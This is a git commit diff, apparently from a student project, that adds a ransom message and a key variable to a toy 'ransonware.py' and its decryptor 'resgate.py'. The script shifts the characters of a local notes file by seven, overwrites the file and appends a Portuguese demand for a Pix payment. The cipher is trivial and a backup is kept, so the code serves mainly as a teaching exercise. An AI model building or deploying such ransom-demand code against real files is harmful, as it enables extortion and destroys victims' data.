ba216686f4b9c909b65890b8a76ed1e4972e0a87
figueirapedro <pedro.figueirab@hotmail.com>
2023-02-24 19:38:55 -0300

    add rescue msg, add variable 'chave'

--- ransonware.py
+++ ransonware.py
@@ -2,10 +2,11 @@
 #   
 #   Desenvolvido por Pedro Figueira, Jean Alves, Vinicius Bonicio, Kathellin Ribeiro
 
+chave = 7
+
 f = open("notas.txt", "r")
 
 texto = f.read()
-f.close()
 
 g = open("backup.txt", "w")
 g.write(texto)
@@ -14,10 +15,12 @@ g.close()
 criptografado = ""
 
 for caracter in texto:
-    criptografado = criptografado + chr(ord(caracter) + 7)
+    criptografado = criptografado + chr(ord(caracter) + chave)
+
+criptografado = criptografado + "\n\nEste arquivo foi sequestrado! Para resgatar-lo faça um pix para\n0bc75dc0-823d-47e3-b290-c6c9c8abf459"
 
 f = open("notas.txt", "w")
 f.write(criptografado)
 f.close()
 
-print("")
+print("Arquivo texto sequestrado com sucesso!")
--- resgate.py
+++ resgate.py
@@ -4,13 +4,16 @@
 
 f = open("notas.txt", "r")
 
+mensagemResgate = "\n\nEste arquivo foi sequestrado! Para resgatar-lo faça um pix para\n0bc75dc0-823d-47e3-b290-c6c9c8abf459"
+chave = 7
+
 texto = f.read()
 f.close()
 
 criptografado = ""
 
-for caracter in texto:
-    criptografado = criptografado + chr(ord(caracter) - 7)
+for caracter in texto.replace(mensagemResgate, ""):
+    criptografado = criptografado + chr(ord(caracter) - chave)
 
 f = open("notas.txt", "w")
 f.write(criptografado)
